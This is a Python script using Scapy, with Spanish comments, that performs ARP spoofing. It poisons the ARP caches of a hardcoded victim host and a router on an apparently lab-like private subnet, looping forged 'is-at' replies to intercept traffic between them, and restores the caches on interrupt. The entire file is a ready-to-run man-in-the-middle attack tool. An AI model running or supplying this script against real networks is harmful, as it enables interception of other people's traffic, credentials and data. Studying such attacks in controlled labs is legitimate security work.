from scapy.all import ARP, Ether, arping, send, conf
import sys
import time


def get_mac(ip):
  # Enviar una solicitud ARP para obtener la dirección MAC de una IP
  ans, _ = arping(ip, timeout=2, verbose=False)
  for s, r in ans:
    return r[Ether].src
  return None


def spoof(target_ip, target_mac, source_ip):
  # Crear y enviar paquetes ARP falsificados
  arp_response = ARP(pdst=target_ip, hwdst=target_mac,
                     psrc=source_ip, op='is-at')
  send(arp_response, verbose=False)


def restore(target_ip, target_mac, source_ip, source_mac):
  # Restaurar la tabla ARP de la víctima
  arp_response = ARP(pdst=target_ip, hwdst=target_mac,
                     psrc=source_ip, hwsrc=source_mac, op='is-at')
  send(arp_response, count=4, verbose=False)


if __name__ == "__main__":

  victim_ip = '192.168.122.178'
  router_ip = '192.168.122.1'
  interface = 'enp1s0'

  conf.iface = interface
  conf.verb = 0

  victim_mac = get_mac(victim_ip)
  router_mac = get_mac(router_ip)

  if victim_mac is None or router_mac is None:
    print("No se pudo obtener la dirección MAC de la víctima o del router.")
    sys.exit(1)

  print("Iniciando ARP spoofing...")

  try:
    while True:
      spoof(victim_ip, victim_mac, router_ip)
      spoof(router_ip, router_mac, victim_ip)
      time.sleep(2)
  except KeyboardInterrupt:
    print("Deteniendo ARP spoofing...")
    restore(victim_ip, victim_mac, router_ip, router_mac)
    restore(router_ip, router_mac, victim_ip, victim_mac)
    print("Restaurado el estado original de la red.")
